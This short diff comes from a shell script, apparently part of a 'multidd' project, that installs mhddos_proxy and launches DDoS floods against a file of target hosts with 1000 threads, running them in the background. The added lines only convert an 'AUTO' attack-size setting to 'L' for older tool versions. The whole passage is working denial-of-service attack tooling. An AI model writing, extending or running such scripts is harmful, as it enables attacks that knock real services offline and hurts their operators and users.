@@ -167,6 +167,8 @@ else
     cd ~/multidd/mhddos_proxy
     python3 -m pip install -r requirements.txt
 
+    if [[ $ddos_size == "AUTO" ]]; then ddos_size="L"; fi #old mhddos_proxy doesn't have "auto" mode, so it's converted to "L"
+
     if [[ $ddos_size == "XS" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 1000 $args_to_pass &
